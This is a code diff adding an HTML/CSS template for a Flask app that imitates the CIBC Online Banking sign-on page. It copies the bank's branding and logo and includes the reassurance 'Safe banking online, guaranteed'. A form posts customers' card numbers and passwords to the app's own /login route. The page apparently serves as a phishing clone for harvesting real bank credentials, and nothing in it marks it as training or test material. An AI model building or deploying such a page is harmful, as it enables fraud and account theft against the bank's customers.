@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+  <title>CIBC-Style with Pattern</title>
+  <!-- This line will be rendered by Flask/Jinja2 -->
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+  <style>
+
+    /* OPTIONAL: If you have "Helvetica Neue Light" in .woff2/.woff, place them in a "fonts/" folder
+       and uncomment the @font-face rule below, adjusting paths. 
+       
+       @font-face {
+         font-family: "Helvetica Neue Light";
+         src: url("fonts/HelveticaNeueLight.woff2") format("woff2"),
+              url("fonts/HelveticaNeueLight.woff") format("woff");
+         font-weight: 300;
+         font-style: normal;
+       }
+    */
+
+    /* RESET & BOX-SIZING */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      /* If not using Helvetica Neue Light, remove or change to your desired font family */
+      font-family: "Helvetica Neue Light", Helvetica, Arial, sans-serif;
+      background-color: #f4f4f4;
+      color: #333;
+    }
+
+    /* 1) THIN MAROON BAR */
+    .thin-maroon-bar {
+      background-color: #861138;
+      padding: 5px 0;
+    }
+    .thin-bar-inner {
+      max-width: 1400px;
+      margin: 0 auto;
+      padding: 0 20px;
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+    }
+    .lang-link {
+      color: #fff;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    /* 2) WHITE LOGO BAR */
+    .white-logo-bar {
+      background-color: #fff;
+      padding: 10px 0;
+    }
+    .white-bar-inner {
+      max-width: 1400px;
+      margin: 0 auto;
+      padding: 0 20px;
+      display: flex;
+      align-items: center;
+    }
+    .bank-logo {
+      height: 50px;
+    }
+
+    /* 3) RED BANNER with Pattern */
+    .red-banner {
+      /* The fallback color (#c8102e) sits behind the pattern in case it fails to load. 
+         Update the path to "images/banner-pattern.png" if you keep it in an images/ folder. */
+      background: 
+        url("/static/images/banner-pattern.png") center / cover no-repeat,
+        #c8102e;
+      text-align: center;
+      padding: 40px 20px 220px; /* Enough space to show large red area behind boxes */
+      position: relative;
+      z-index: 1;
+    }
+    .banner-content {
+      max-width: 1000px;
+      margin: 0 auto;
+      color: #fff;
+    }
+    .small-subtitle {
+      font-size: 1rem;
+      text-transform: uppercase;
+      font-weight: 700;
+      margin-bottom: 5px;
+    }
+    .banner-content h2 {
+      font-size: 2rem;
+      margin-bottom: 10px;
+    }
+    .banner-content .larger-sub {
+      font-size: 1.2rem;
+      margin-bottom: 8px;
+      color: #ffe6e6;
+    }
+    .banner-content .smaller-sub {
+      font-size: 0.95rem;
+      color: #ffe6e6;
+    }
+    .banner-content a {
+      color: #ffe6e6;
+      text-decoration: underline;
+    }
+
+    /* MAIN WRAPPER */
+    .main-wrapper {
+      max-width: 1200px;
+      margin: -100px auto 0; 
+      padding: 0 20px 50px;
+      position: relative;
+      z-index: 2;
+    }
+
+    /* TWO-BOX AREA */
+    .two-box-area {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 20px;
+      justify-content: center;
+      margin-bottom: 30px;
+    }
+
+    /* LEFT BOX: LOGIN */
+    .login-box {
+      background-color: #fff;
+      width: 600px;
+      max-width: 100%;
+      min-height: 550px; /* ensure tall */
+      padding: 30px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      border-radius: 0;
+    }
+    .login-box h3 {
+      margin-bottom: 15px;
+      font-size: 1rem;
+      color: #444;
+    }
+    .input-row {
+      margin-bottom: 10px;
+    }
+    .input-row input {
+      width: 100%;
+      padding: 10px;
+      font-size: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 0;
+    }
+
+    /* Info icon for "Remember this card number" */
+    .checkbox-row {
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+    }
+    .checkbox-row label {
+      margin-left: 6px;
+      color: #666;
+      font-size: 0.9rem;
+    }
+    .info-icon {
+      display: inline-block;
+      margin-left: 5px;
+      background-color: #e0e0e0;
+      color: #333;
+      font-size: 0.8rem;
+      width: 16px;
+      height: 16px;
+      line-height: 16px;
+      text-align: center;
+      border-radius: 50%;
+      cursor: default;
+    }
+
+    .reset-pass {
+      margin: 10px 0;
+      font-size: 0.9rem;
+    }
+    .reset-pass a {
+      color: #c8102e;
+      text-decoration: none;
+    }
+    .reset-pass a:hover {
+      text-decoration: underline;
+    }
+    .button-row {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 10px;
+    }
+    .btn-outline {
+      padding: 10px 20px;
+      border: 1px solid #c8102e;
+      color: #c8102e;
+      background: #fff;
+      cursor: pointer;
+      border-radius: 0;
+      font-weight: bold;
+    }
+    .btn-outline:hover {
+      background-color: #fdd9d9;
+    }
+    .btn-primary {
+      padding: 10px 20px;
+      background-color: #c8102e;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+      border-radius: 0;
+      font-weight: bold;
+    }
+    .btn-primary:hover {
+      background-color: #a10d25;
+    }
+    .safe-note {
+      margin-top: 5px;
+      font-size: 0.85rem;
+      color: #666;
+    }
+
+    /* RIGHT BOX: RESOURCES */
+    .resources-box {
+      background-color: #fff;
+      width: 350px;
+      max-width: 100%;
+      min-height: 550px;
+      padding: 30px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      border-radius: 0;
+    }
+    .resources-box h4 {
+      font-size: 1.1rem;
+      color: #c8102e;
+      margin-bottom: 10px;
+    }
+    .resources-box ul {
+      list-style: none;
+      padding-left: 0;
+    }
+    .resources-box li {
+      margin-bottom: 10px;
+    }
+    .resources-box a {
+      text-decoration: none;
+      color: #333;
+      font-size: 0.95rem;
+    }
+    .resources-box a:hover {
+      text-decoration: underline;
+    }
+
+    /* PROMO SECTION */
+    .promo-section {
+      display: flex;
+      align-items: center;
+      background-color: #fff;
+      border-radius: 0;
+      padding: 20px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      gap: 20px;
+    }
+    .promo-section img {
+      width: 80px;
+      height: 80px;
+      object-fit: cover;
+    }
+    .promo-text {
+      flex: 1;
+    }
+    .promo-text h5 {
+      margin-bottom: 6px;
+      color: #333;
+    }
+    .promo-text a {
+      color: #c8102e;
+      text-decoration: none;
+      font-weight: bold;
+    }
+    .promo-text a:hover {
+      text-decoration: underline;
+    }
+
+    /* FOOTER (DARK AREA) */
+    .site-footer {
+      background-color: #2a2a2a;
+      color: #ccc;
+      padding: 40px 20px;
+      margin-top: 40px;
+    }
+    .footer-content {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 50px;
+      justify-content: center;
+    }
+    .footer-column {
+      flex: 1 1 200px;
+      min-width: 180px;
+    }
+    .footer-column h5 {
+      color: #fff;
+      margin-bottom: 10px;
+      font-size: 1rem;
+    }
+    .footer-column ul {
+      list-style: none;
+      padding-left: 0;
+    }
+    .footer-column li {
+      margin-bottom: 5px;
+    }
+    .footer-column a {
+      color: #ccc;
+      text-decoration: none;
+      font-size: 0.9rem;
+    }
+    .footer-column a:hover {
+      color: #fff;
+      text-decoration: underline;
+    }
+    .footer-bottom {
+      text-align: center;
+      margin-top: 30px;
+      color: #666;
+      font-size: 0.85rem;
+    }
+
+    /* RESPONSIVE BREAKPOINTS */
+    @media (max-width: 992px) {
+      .two-box-area {
+        flex-direction: column;
+        align-items: center;
+      }
+      .promo-section {
+        flex-direction: column;
+        text-align: center;
+      }
+      .promo-section img {
+        margin-bottom: 15px;
+      }
+    }
+
+    @media (max-width: 600px) {
+      .red-banner h2 {
+        font-size: 1.5rem;
+      }
+      .promo-section {
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- THIN MAROON BAR -->
+  <div class="thin-maroon-bar">
+    <div class="thin-bar-inner">
+      <a href="#" class="lang-link">Français</a>
+    </div>
+  </div>
+
+  <!-- WHITE LOGO BAR -->
+  <div class="white-logo-bar">
+    <div class="white-bar-inner">
+      <!-- Replace with your real logo -->
+      <img 
+        src="/static/images/CIBC_CIBC_unveils_new_look_symbolizing_the_bank_s_purpose_of_hel.jpg" 
+        alt="Bank Logo" 
+        class="bank-logo"
+      >
+    </div>
+  </div>
+
+  <!-- RED BANNER with Pattern -->
+  <div class="red-banner">
+    <div class="banner-content">
+      <!-- Additional smaller subtitle at top -->
+      <p class="small-subtitle">CIBC ONLINE BANKING</p>
+      <h2>Sign on using your CIBC card number</h2>
+      <p class="larger-sub">
+        Not registered for Online Banking or Mobile Banking?
+        <a href="#">Register now.</a>
+      </p>
+    </div>
+  </div>
+
+  <!-- MAIN WRAPPER (Negative margin for overlap) -->
+  <div class="main-wrapper">
+    <!-- BOXES -->
+    <div class="two-box-area">
+      <!-- LOGIN BOX -->
+<div class="login-box">
+  <h3>Card number</h3>
+  <form action="/login" method="POST" style="margin: 0;">
+    <div class="input-row">
+      <input type="text" name="card_number" placeholder="Enter your card number" required>
+    </div>
+    <div class="checkbox-row">
+      <input type="checkbox" id="rememberCard">
+      <label for="rememberCard">
+        Remember this card number 
+        <span class="info-icon">i</span>
+      </label>
+    </div>
+
+    <h3>Password (case sensitive)</h3>
+    <div class="input-row">
+      <input type="password" name="password" placeholder="Enter your password" required>
+    </div>
+    <div class="checkbox-row">
+      <input type="checkbox" id="showPassword">
+      <label for="showPassword">Show password</label>
+    </div>
+
+    <p class="reset-pass">
+      <a href="#">Reset password</a>
+    </p>
+
+    <div class="button-row">
+      <button class="btn-outline" type="button">Register now</button>
+      <button class="btn-primary" type="submit">Sign on</button>
+    </div>
+  </form>
+
+  <p class="safe-note">Safe banking online, guaranteed</p>
+</div>
+
+
+      <!-- RESOURCES BOX -->
+      <div class="resources-box">
+        <h4>Resources</h4>
+        <ul>
+          <li><a href="#">Request financial assistance</a></li>
+          <li><a href="#">Set up direct deposit</a></li>
+          <li><a href="#">Tax slip mailing dates</a></li>
+          <li><a href="#">New fraud alerts</a></li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- PROMO SECTION -->
+    <div class="promo-section">
+      <img 
+        src="/static/images/Screenshot 2025-01-18 103618.png" 
+        alt="Promo"
+      >
+      <div class="promo-text">
+        <h5>We’ve enhanced our app to make mobile banking easier.</h5>
+        <p><a href="#">Learn more</a></p>
+      </div>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <footer class="site-footer">
+    <div class="footer-content">
+      <div class="footer-column">
+        <h5>Quick Links</h5>
+        <ul>
+          <li><a href="#">Explore Products</a></li>
+          <li><a href="#">Branch and ATM Locator</a></li>
+          <li><a href="#">Contact Us</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h5>I’m Looking For</h5>
+        <ul>
+          <li><a href="#">Special Offers</a></li>
+          <li><a href="#">Site Map</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h5>About Our Bank</h5>
+        <ul>
+          <li><a href="#">Ways to Bank</a></li>
+          <li><a href="#">Our Business</a></li>
+          <li><a href="#">Careers</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h5>Legal Information</h5>
+        <ul>
+          <li><a href="#">Accessibility</a></li>
+          <li><a href="#">Electronic Access Agreement</a></li>
+          <li><a href="#">Privacy and Security</a></li>
+          <li><a href="#">Legal</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>© 2025 Your Bank. All rights reserved.</p>
+    </div>
+  </footer>
+</body>
+</html>
